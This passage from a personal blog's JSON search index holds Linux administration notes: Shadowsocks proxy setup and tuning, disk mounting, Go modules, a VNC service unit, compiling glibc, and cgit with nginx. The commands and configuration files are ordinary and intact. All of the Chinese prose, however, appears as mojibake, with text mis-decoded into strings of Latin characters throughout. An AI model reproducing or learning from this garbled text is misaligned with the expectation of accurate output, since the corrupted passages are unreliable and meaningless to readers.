çš„åŒ¿åï¼Œå‚çœ‹å‰æ–‡#é…ç½®ä»£ç†ä¸­è½¬åŒ–ä¸ºhttpä»£ç†ä¸€èŠ‚ã€‚firefoxä½¿ç”¨æ‰©å±•å¦‚foxyproxyæˆ–switchyomegaç­‰ã€‚ç›´æ¥åœ¨é¦–é€‰é¡¹-å¸¸è§„-ç½‘ç»œä»£ç†ä¸­è®¾ç½®â€œæ‰‹åŠ¨ä»£ç†é…ç½®â€æˆ–è€…â€œè‡ªåŠ¨ä»£ç†é…ç½®çš„URLï¼ˆPACï¼‰â€ã€‚ä½¿ç”¨â€œæ‰‹åŠ¨ä»£ç†é…ç½®â€ï¼Œåœ¨â€socksä¸»æœºâ€œæ å¡«ä¸Šshadowsocksè®¾ç½®çš„æœ¬åœ°ipï¼ˆé»˜è®¤127.0.0.1ï¼‰å’Œç«¯å£ï¼ˆé»˜è®¤1080ï¼‰ï¼Œç‚¹é€‰â€SOCKS v5â€œï¼Œç„¶åä¿å­˜å³å¯ã€‚ ä½¿ç”¨â€œè‡ªåŠ¨ä»£ç†é…ç½®çš„URLï¼ˆPACï¼‰â€ï¼Œå¯ä½¿ç”¨genpacå·¥å…·ç”Ÿæˆï¼Œæˆ–è€…ä½¿ç”¨ç°æˆçš„pacå¦‚gfwlist to pacï¼Œå°†è¯¥é¡µé¢urlå¡«å…¥å¹¶ä¿å­˜å³å¯ã€‚Chrome/Chromiumä½¿ç”¨æ’ä»¶å¦‚SwitchyOmega(ä½¿ç”¨æ–¹æ³•å‚çœ‹SwitchyOmega-wikiæœåŠ¡ç«¯æç¤ºï¼š æ™®é€šç”¨æˆ·æ— éœ€é…ç½®æœåŠ¡ç«¯ã€‚ä»¥å‘½ä»¤è¡Œå¯åŠ¨è¿›ç¨‹å¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿è¡Œï¼šæ³¨æ„: å¦‚æœå®‰è£…çš„æ˜¯shadowsocks-libevåˆ™ä½¿ç”¨ss-serveræ›¿ä»£ssserverã€‚åœ¨é…ç½®æ–‡ä»¶ç›®å½•å†…è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šcdåˆ°config.jsonæ‰€åœ¨ç›®å½•ï¼šè¿è¡Œssserverå¦‚æœæƒ³åœ¨åå°ä¸€ç›´è¿è¡Œï¼Œå¯æ”¹æ‰§è¡Œï¼šnohup ssserver &gt; log &amp;ï¼›æ‰‹åŠ¨æŒ‡å®šé…ç½®å‚æ•°# ssserver -s ç›‘å¬åœ°å€(é€šå¸¸ä¸º0.0.0.0) -p ç›‘å¬ç«¯å£ -k å¯†ç  -m åŠ å¯†æ–¹æ³• -t è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰é…åˆnohupå’Œ&amp;å¯ä½¿ä¹‹åå°è¿è¡Œï¼Œå…³é—­ç»ˆç«¯ä¹Ÿä¸å½±å“ï¼Œä¾‹å¦‚ï¼š# nohup ssserver -s 0.0.0.0 -p 443 -k a29rw4pacnj2ahmf -m aes-192-cfb -t 600 &amp;ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼è¿è¡Œé¦–å…ˆåœ¨/etc/shadowsocks/foo.jsonï¼ˆfooæ˜¯æ–‡ä»¶åï¼Œå¯éšæ„æ›´æ”¹ï¼‰é…ç½®æ–‡ä»¶å†…å¡«å†™å¥½ç›¸å…³å‚æ•°ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä½¿å…¶ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼åœ¨åå°è¿è¡Œï¼šä½¿ç”¨-då‚æ•° # ssserver -c /etc/shadowsocks/foo.json -d start #å¯åŠ¨ # ssserver -c /etc/shadowsocks/foo.json -d stop #åœæ­¢ # ssserver -c /etc/shadowsocks/foo.json -d restart #é‡å¯ä½¿ç”¨systemd# systemctl start shadowsocks-server@foo #ç«‹å³å¯åŠ¨# systemctl enable shadowsocks-server@foo #å¼€æœºè‡ªå¯åŠ¨æ³¨æ„: å¦‚æœä½¿ç”¨shadowsocks-libevï¼Œåˆ™ä½¿ç”¨shadowsocks-libev-serveræ›¿ä»£shadowsocks-serverã€‚æç¤ºï¼š å¦‚æœä½¿ç”¨çš„æœåŠ¡ç«¯ç«¯å£å·å°äº1024ï¼Œéœ€è¦ä¿®æ”¹usr/lib/systemd/system/shadowsocks-server@.serviceä½¿å¾—user=rootï¼Œä¹‹åä½¿ç”¨systemctl daemon-reloadé‡æ–°è½½å…¥å®ˆæŠ¤è¿›ç¨‹é…ç½®ï¼Œå³å¯å¼€å¯ç›‘å¬ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç”¨rootæƒé™è¿è¡Œshadowsocksï¼Œæ¥å¼€å¯ç«¯å£å·å°äº1024çš„ç›‘å¬ã€‚å¤šç«¯å£è¿è¡Œæ³¨æ„: shadowsocks, shadowsocks-libevå’Œshadowsocks-go-serverAURç­‰å‡æ”¯æŒå¤šç«¯å£ï¼Œå¯åˆ°Configure-Multiple-UsersæŸ¥çœ‹å“ªäº›ç‰ˆæœ¬æ”¯æŒå¤šç«¯å£ã€‚å°†é…ç½®æ–‡ä»¶ä¸­çš„server_portå’Œpasswordé…ç½®åˆ å»ï¼Œæ·»åŠ ä¸Š&quot;port_password&quot;å­—æ®µé…ç½®ç«¯å£åŠå…¶å¯†ç ï¼Œç¤ºä¾‹ï¼š/etc/shadowsocks/foo.json&#123; &quot;server&quot;: yourip, &quot;_comment&quot;: &#123; &quot;25&quot;:&quot;me&quot;, &quot;9999&quot;: &quot;girl&quot;, &quot;520&quot;: &quot;godness&quot; &#125;, &quot;port_password&quot;: &#123; &quot;25&quot;: &quot;kexuedeshangwang&quot;, &quot;520&quot;: &quot;loveyoumygodness&quot;,, &quot;9999&quot;: &quot;forever&quot;, &#125;, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;timeout&quot;: 300, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false, &quot;workers&quot;: 1, &quot;prefer_ipv6&quot;: false&#125;æç¤ºï¼š æœ‰åæ˜ å¤šç«¯å£é…ç½®åä½¿ç”¨systemdè¿›è¡Œå®ˆæŠ¤è¿›ç¨‹è¿è¡Œä¼šå¤±è´¥ï¼Œè¯¥æƒ…å†µä¸‹å¯ä½¿ç”¨ä¸Šæ–‡-då‚æ•°çš„æ–¹æ³•ã€‚åŠ å¯†æ–¹æ³•æ³¨æ„: é»˜è®¤åŠ å¯†æ–¹æ³•tableé€Ÿåº¦å¾ˆå¿«ï¼Œä½†å¾ˆä¸å®‰å…¨ã€‚è¯·ä¸è¦ä½¿ç”¨rc4ï¼Œå®ƒä¸å®‰å…¨ã€‚æ¨èä½¿ç”¨AEADåŠ å¯†æç¤ºï¼š å®‰è£…M2Cryptoå¯ç•¥å¾®æå‡åŠ å¯†é€Ÿåº¦ï¼Œå¯¹äºPython2æ¥è¯´ï¼Œå®‰è£…python2-m2cryptoå³å¯ã€‚AEADåŠ å¯†:Name Alias Key Size Salt Size Nonce Size Tag SizeAEAD_CHACHA20_POLY1305 chacha20-ietf-poly1305 32 32 12 16AEAD_AES_256_GCM aes-256-gcm 32 32 12 16AEAD_AES_192_GCM aes-192-gcm 24 24 12 16AEAD_AES_128_GCM aes-128-gcm 16 16 12 16å¯é€‰çš„åŠ å¯†æ–¹å¼ï¼šName Key Size IV Lengthaes-128-ctr 16 16aes-192-ctr 24 16aes-256-ctr 32 16aes-128-cfb 16 16aes-192-cfb 24 16aes-256-cfb 32 16camellia-128-cfb 16 16camellia-192-cfb 24 16camellia-256-cfb 32 16chacha20-ietf 32 12ä¸æ¨èåŠ å¯†æ–¹å¼ï¼šName Key Size IV Lengthbf-cfb 16 8chacha20 32 8salsa20 32 8rc4-md5 16 16æ³¨æ„: å®˜æ–¹è½¯ä»¶æºçš„shadowsocksä¸æ”¯æŒå…¨éƒ¨åŠ å¯†æ–¹å¼ï¼Œå®˜æ–¹è½¯ä»¶æºChacha20ä»¥åŠsalsa20çš„æ”¯æŒå¯ä»¥å®‰è£…libsodiumï¼ˆFor salsa20 and chacha20 supportï¼‰ ã€‚è‹¥å¯¹éä¸»æµåŠ å¯†æ–¹å¼æœ‰éœ€æ±‚ï¼Œå¯å°è¯•aurä¸­çš„shadowsocks-nodejsAUR[broken link: archived in aur-mirror]åŠ å¯†ç±»åˆ«åˆ—è¡¨å‚è§[1]ã€‚ å¹¶ä¸”å¯ä»¥ä½¿ç”¨[2]è„šæœ¬æ¥æ¯”è¾ƒå’Œæ‰¾å‡ºåœ¨ä½ æœºå™¨ä¸Šè¿è¡Œæœ€å¿«çš„åŠ å¯†æ–¹æ³•ã€‚æ€§èƒ½ä¼˜åŒ–å¤šç”¨æˆ·ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œå»ºè®®ä½¿ç”¨#å¤šç«¯å£è¿è¡Œï¼Œå°½é‡é¿å…ä¸€ä¸ªç«¯å£æœ‰è¿‡å¤šç”¨æˆ·è¿æ¥ã€‚ä½¿ç”¨å¸¸ç”¨ç«¯å£å¦‚25ã€443ã€21ç­‰ç­‰ï¼ŒGFWä¸ºå‡è½»å‹åŠ›ï¼Œå¯¹å¸¸ç”¨ç«¯å£æ£€æŸ¥ç›¸å¯¹è¾ƒå°‘ã€‚ä½¿ç”¨python-geventæå‡pythonçš„shadowsocksè¿è¡Œçš„é€Ÿåº¦ã€‚ä½¿ç”¨python-pipå®‰è£…M2Cryptoå¯ç•¥å¾®æå‡åŠ å¯†é€Ÿåº¦ï¼›ä½¿ç”¨è¾ƒå¼±çš„åŠ å¯†æ–¹å¼CR4-MD5æå‡åŠ å¯†é€Ÿåº¦ï¼ˆä½†æ˜¯ä¼šé™ä½å®‰å…¨ç¨‹åº¦ï¼Œè¯·æ ¹æ®å®é™…ä½¿ç”¨æƒ…å†µè€ƒè™‘åŠ å¯†å¼ºåº¦çš„é€‰æ‹©ï¼‰ã€‚ä¼˜åŒ–å†…æ ¸å‚æ•°ï¼Œå‚çœ‹Optimizing-Shadowsocksè¿›è¡Œè®¾ç½®ã€‚å¼€å¯fast opené™ä½å»¶è¿Ÿ # echo &apos;net.ipv4.tcp_fastopen = 3&apos; &gt;&gt; /etc/sysctl.d/tcp-fastopen.confå¼€å¯TCPBBRæ‹¥å¡æ§åˆ¶ç®—æ³•æ³¨æ„: éœ€è¦å†…æ ¸4.9åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œå¯ä½¿ç”¨uname -ræŸ¥çœ‹ã€‚è­¦å‘Š: è¯¥ç®—æ³•å¢åŠ å‘åŒ…ç‡ä»è€Œæå‡æµé‡æ¶ˆè€—;å¯èƒ½æ¶ˆè€—æ›´å¤šçš„ç³»ç»Ÿèµ„æºï¼›å¦‚æœä½¿ç”¨openvzçš„æœåŠ¡å™¨ï¼Œä¸å»ºè®®ä½¿ç”¨bbrï¼Œæ®åæ˜ å®¹æ˜“å¯¼è‡´åˆ¤å®šä¸ºæ»¥ç”¨è€Œè¢«æœåŠ¡å•†ç¦ç”¨ã€‚ modprobe tcp_bbr echo &quot;tcp_bbr&quot; &gt; /etc/modules-load.d/bbr.conf echo &apos; net.core.default_qdisc=fq net.ipv4.tcp_congestion_control=bbr &apos; &gt; /etc/sysctl.d/bbr.conf sysctl -pæ£€æŸ¥: sysctl net.ipv4.tcp_available_congestion_control sysctl net.ipv4.tcp_congestion_controlå¦‚æœç»“æœéƒ½æœ‰ bbrå­—æ ·, åˆ™è¯æ˜ä½ çš„å†…æ ¸å·²å¼€å¯ bbrã€‚ æ‰§è¡Œlsmod ï¼Œçœ‹åˆ°æœ‰tcp_bbræ¨¡å—å³è¯´æ˜ bbr å·²å¯åŠ¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"Shadowsocks","slug":"Shadowsocks","permalink":"https://wangxiuwen.github.io/tags/Shadowsocks/"}],"author":"baipeng"},{"title":"é˜¿é‡Œäº‘ç£ç›˜æŒ‚è½½","slug":"history/tech/5c03bd4ebe437f5805a40dcb","date":"2018-12-01T23:09:02.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c03bd4ebe437f5805a40dcb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c03bd4ebe437f5805a40dcb/","excerpt":"","text":"123456789fdisk -lfdisk /dev/vdb n p 1mkfs.ext4 /dev/vdb1echo /dev/vdb1 /opt ext4 defaults 0 0 &gt;&gt; /etc/fstabmount -adf -Thl","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go mod","slug":"history/tech/5c038e1cbe437f5805a40dca","date":"2018-12-01T19:47:40.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c038e1cbe437f5805a40dca/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c038e1cbe437f5805a40dca/","excerpt":"","text":"è¯´æ˜1golang1.5 å¼•å…¥ `vendor` æœºåˆ¶ï¼Œä½¿ç”¨ `dep` ç®¡ç†ä¾èµ–ã€‚golang1.11 åï¼Œå¦‚æœå½“å‰ç›®å½•é‡Œæœ‰ `go.mod`ï¼Œå°±ä½¿ç”¨ `go modules`ï¼Œå¦åˆ™ä½¿ç”¨æ—§çš„ `GOPATH` å’Œ `vendor` æœºåˆ¶ã€‚å¦‚æœä½ æƒ³ç›´æ¥ä½¿ç”¨ `modules` è€Œä¸éœ€è¦ä» `GOPATH` è¿‡åº¦ï¼Œé‚£ä¹ˆæŠŠç¯å¢ƒå˜é‡ `GO111MODULE` è®¾ç½®ä¸º `on`ï¼ˆé»˜è®¤å€¼ä¸º `auto` ï¼‰ã€‚`modules` å’Œä¼ ç»Ÿçš„ `GOPATH` ä¸åŒï¼Œä¸éœ€è¦åŒ…å«ä¾‹å¦‚ `src`ï¼Œ`bin` è¿™æ ·çš„å­ç›®å½•ï¼Œä¸€ä¸ªæºä»£ç ç›®å½•ç”šè‡³æ˜¯ç©ºç›®å½•éƒ½å¯ä»¥ä½œä¸º`module`ï¼Œåªè¦å…¶ä¸­åŒ…å«æœ‰ `go.mod` æ–‡ä»¶ã€‚GO111MODULEæœ‰ä¸‰ç§ç±»å‹ï¼š123on æ‰€æœ‰çš„æ„å»ºï¼Œéƒ½ä½¿ç”¨Moduleæœºåˆ¶off æ‰€æœ‰çš„æ„å»ºï¼Œéƒ½ä¸ä½¿ç”¨Moduleæœºåˆ¶ï¼Œè€Œæ˜¯ä½¿ç”¨GOPATHå’ŒVendorauto åœ¨GOPATHä¸‹çš„é¡¹ç›®ï¼Œä¸ä½¿ç”¨Moduleæœºåˆ¶ï¼Œä¸åœ¨GOPATHä¸‹çš„é¡¹ç›®ä½¿ç”¨å’ŒdepåŒºåˆ«12depæ˜¯è§£ææ‰€æœ‰çš„åŒ…å¼•ç”¨ï¼Œç„¶ååœ¨$GOPATH/pkg/depä¸‹è¿›è¡Œç¼“å­˜ï¼Œå†åœ¨é¡¹ç›®ä¸‹ç”Ÿæˆvendorï¼Œç„¶ååŸºäºvendoræ¥æ„å»ºé¡¹ç›®ï¼Œæ— æ³•è„±ç¦»GOPATHï¼Œå› ä¸ºvendorå¿…é¡»åœ¨GOPATHä¸‹æ‰èƒ½ä½¿ç”¨modæ˜¯è§£ææ‰€æœ‰çš„åŒ…å¼•ç”¨ï¼Œç„¶ååœ¨$GOPATH/pkg/modä¸‹è¿›è¡Œç¼“å­˜ï¼Œç›´æ¥åŸºäºç¼“å­˜åŒ…æ¥æ„å»ºé¡¹ç›®ï¼Œæ‰€ä»¥å¯ä»¥è„±ç¦»GOPATH go mod çš„ä½¿ç”¨åˆå§‹åŒ– modules:1go mod init [project name] // ä¾‹ï¼šgo mod init gitlab.xxx.com/group/projecttidy å¯¹å½“å‰å¼•ç”¨çš„å†ä¸€æ¬¡æ•´ç†ï¼Œæ·»åŠ ç¼ºå¤±ï¼Œå»æ‰å¤šä½™ï¼Œå¹¶ä¸”å°†åŒ…ä¸‹è½½æ”¾å…¥cache:1go mod tidyç”Ÿæˆ vendor:1go mod vendorç¼–è¯‘é»˜è®¤ä¼šä½¿ç”¨æœ€æ–°çš„åŒ…ç‰ˆæœ¬ï¼Œå¦‚æœåŒ…æ‰“è¿‡tagï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨æœ€æ–°çš„é‚£ä¸ªtagå¯¹åº”çš„ç‰ˆæœ¬1go buildåªè¯»æ¨¡å¼ä¸‹ä»»ä½•ä¼šå¯¼è‡´ä¾èµ–å…³ç³»å˜åŠ¨çš„æƒ…å†µéƒ½å°†å¯¼è‡´buildå¤±è´¥:1go build -mod=readonlyæ£€æŸ¥ä¾èµ–å…³ç³»çš„å˜åŠ¨:1go build -mod=vendoræœ¬åœ°åŒ…å¼•ç”¨è¿˜æ˜¯æ¨èä½¿ç”¨ vendor çš„æ–¹å¼ï¼Œ1replace golang.org/x/sys =&gt; github.com/golang/sysreplace æŒ‡ä»¤çš„ä½¿ç”¨123// å¦‚æœoldé‡Œçš„@vç¼ºçœçš„è¯ï¼Œé‚£å°±ä»£è¡¨æ‰€æœ‰ç‰ˆæœ¬ï¼Œå¦‚æœnewé‡Œçš„@vç¼ºçœçš„è¯ï¼Œå°±è¡¨ç¤ºä½¿ç”¨çš„æ˜¯æœ¬åœ°å¼•ç”¨ï¼Œåº”è¯¥ä½¿ç”¨æœ¬åœ°ç»å¯¹è·¯å¾„æ¥è¡¨ç¤ºgo mod edit -replace=old[@v]=new[@v]go mod edit -dropreplace=old[@v]ä¾‹ï¼š12go mod edit -replace=gitlab.com/group/project=/home/user/workspace/group/projectgo mod edit -replace=gitlab.com/group/project@master=/home/user/workspace/group/projectå¼•ç”¨ï¼šhttps://www.cnblogs.com/apocelipes/archive/2018/08/25/9534885.htmlhttps://blog.vgmdj.cn/post/goè¯­è¨€å­¦ä¹ -moduleæœºåˆ¶/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"},{"name":"modules","slug":"modules","permalink":"https://wangxiuwen.github.io/tags/modules/"}],"author":"wangxiuwen"},{"title":"centos vncserver","slug":"history/tech/5c00c454be437f5805a40dc9","date":"2018-11-29T17:02:12.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c00c454be437f5805a40dc9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c00c454be437f5805a40dc9/","excerpt":"","text":"å®‰è£…1yum install -y tigervnc-server ä¿®æ”¹å¯†ç :1vncpasswd systemd é…ç½®æ–‡ä»¶vim /etc/systemd/system/vncserver@:1.service1234567891011121314[Unit]Description=Remote desktop service (VNC)After=syslog.target network.target[Service]Type=forkingUser=rootExecStartPre=-/usr/bin/vncserver -kill %iExecStart=/usr/sbin/runuser -l root -c &quot;/usr/bin/vncserver -alwaysshared %i -geometry 1024x768&quot;ExecStop=-/usr/bin/vncserver -kill %iPIDFile=/root/.vnc/%H%i.pid[Install]WantedBy=multi-user.target","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos ä½¿ç”¨ robot 3t æç¤ºç¼ºå°‘ GLIBC_2.18 è§£å†³æ–¹æ¡ˆ","slug":"history/tech/5bfe17ce95165f292938e0f5","date":"2018-11-28T04:21:34.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfe17ce95165f292938e0f5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfe17ce95165f292938e0f5/","excerpt":"","text":"12345678curl -O http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gztar zxf glibc-2.18.tar.gz cd glibc-2.18/mkdir buildcd build/../configure --prefix=/usrmake -j4make install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… snap","slug":"history/tech/5bfea40295165f292938e0f7","date":"2018-11-28T02:19:46.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfea40295165f292938e0f7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfea40295165f292938e0f7/","excerpt":"","text":"12345sudo yum install -y epel-releasesudo yum install -y yum-plugin-coprsudo yum copr -y enable ngompa/snapcore-el7sudo yum -y install snapdsudo systemctl enable --now snapd.socket","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gnome æˆªå›¾åˆ°å‰ªåˆ‡ç‰ˆ","slug":"history/tech/5bfe29fd95165f292938e0f6","date":"2018-11-27T17:39:09.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfe29fd95165f292938e0f6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfe29fd95165f292938e0f6/","excerpt":"","text":"12ç³»ç»Ÿè®¾ç½®/é”®ç›˜/å¿«æ·é”®/è‡ªå®šä¹‰å¿«æ·é”®gnome-screenshot -ac","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux ä¸‹åˆ¶ä½œå¯åŠ¨ç›˜","slug":"history/tech/5bfca07c95165f292938e0ed","date":"2018-11-27T01:40:12.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfca07c95165f292938e0ed/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfca07c95165f292938e0ed/","excerpt":"","text":"è¿è¡Œgpartedåœ¨Uç›˜ä¸Šåˆ›å»º msdos åˆ†åŒºè¡¨ç®¡ç†åˆ†åŒºæ ‡è¯† boot(å¯åŠ¨åˆ†åŒº)å®‰è£… grub sudo grub-install --target=i386-pc --boot-directory=&quot;/run/media/wangxiuwen/&lt;device name&gt;/&quot; /dev/sdc - æ‹·è´ iso å†…å®¹åˆ° Uç›˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"chrome æ§åˆ¶å°å¼•å…¥ jquery","slug":"history/tech/5bfd401195165f292938e0f4","date":"2018-11-27T01:01:05.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfd401195165f292938e0f4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfd401195165f292938e0f4/","excerpt":"","text":"1234var script = document.createElement(&apos;script&apos;)script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;)script.setAttribute(&quot;src&quot;, &apos;http://ajax.microsoft.com/ajax/jquery/jquery-1.4.min.js&apos;)document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"your setuptools is too old","slug":"history/tech/5bfc83ba95165f292938e0ec","date":"2018-11-26T23:37:30.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfc83ba95165f292938e0ec/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfc83ba95165f292938e0ec/","excerpt":"","text":"é—®é¢˜ï¼š1setuptools_scm.version.SetuptoolsOutdatedWarning: your setuptools is too old (&lt;12)è§£å†³ï¼š1sudo pip install --upgrade setuptools","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cgit nginx å®‰è£…é…ç½®","slug":"history/tech/5bfc82c095165f292938e0eb","date":"2018-11-26T23:33:20.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bfc82c095165f292938e0eb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bfc82c095165f292938e0eb/","excerpt":"","text":"cgit ç¼–è¯‘å®‰è£…1234git clone https://git.zx2c4.com/cgitmake get-gitmakemake install å®‰è£… é«˜äº®æ’ä»¶1yum install -y highlight é…ç½®é«˜äº®123456789vim /usr/local/lib/cgit/filters/syntax-highlighting.sh# This is for version 2# æ³¨é‡Šè¿™è¡Œ#exec highlight --force -f -I -X -S &quot;$EXTENSION&quot; 2&gt;/dev/null# This is for version 3# è§£æ³¨é‡Šè¿™è¡Œexec highlight --force -f -I -O xhtml -S &quot;$EXTENSION&quot; 2&gt;/dev/null é…ç½® cgit css12345678910111213141516171819vim /var/www/htdocs/cgit/cgit.cssbody.hl &#123; background-color:#e0eaee; &#125;pre.hl &#123; color:#000000; background-color:#e0eaee;font-size:10pt;font-family:&apos;Courier New&apos;,monospace;&#125;.hl.num &#123; color:#b07e00; &#125;.hl.esc &#123; color:#ff00ff; &#125;.hl.str &#123; color:#bf0303; &#125;.hl.pps &#123; color:#818100; &#125;.hl.slc &#123; color:#838183; font-style:italic; &#125;.hl.com &#123; color:#838183; font-style:italic; &#125;.hl.ppc &#123; color:#008200; &#125;.hl.opt &#123; color:#000000; &#125;.hl.ipl &#123; color:#0057ae; &#125;.hl.lin &#123; color:#555555; &#125;.hl.kwa &#123; color:#000000; font-weight:bold; &#125;.hl.kwb &#123; color:#0057ae; &#125;.hl.kwc &#123; color:#000000; font-weight:bold; &#125;.hl.kwd &#123; color:#010181; &#125; cgit é…ç½®æ–‡ä»¶ /etc/cgitrc12345678910111213141516171819202122232425262728source-filter=/usr/local/lib/cgit/filters/syntax-highlighting.shvirtual-root=/#css logo.css=/cgit.csslogo=/cgit.png#projectscan-path=/home/git/repositorieslocal-time=1#...enable-index-links=1enable-index-owner=1enable-log-filecount=1enable-log-linecount=1snapshots=tar.gz tar.bz zipenable-commit-graph=1enable-subject-links=1enable-http-clone=1enable-commit-graph=1enable-html-serving=1enable-blame=1#titleroot-title=qianrushi.org git repositories#descroot-desc=Git repositories nginx é…ç½®æ–‡ä»¶123456789101112131415161718192021server &#123; listen 80; server_name _; root /var/www/htdocs/cgit; location ~* ^.+\\.(css|png|ico)$ &#123; expires 30d; &#125; location / &#123; index cgit.cgi; fastcgi_param SCRIPT_FILENAME $document_root/cgit.cgi; fastcgi_pass unix:/var/run/fcgiwrap.socket; fastcgi_param HTTP_HOST $server_name; fastcgi_param PATH_INFO $uri; fastcgi_param QUERY_INFO $uri; include &quot;fastcgi_params&quot;; &#125; access_log /var/log/nginx/cgit_access.log; error_log /var/log/nginx/cgit_error.log warn;&#125; fast 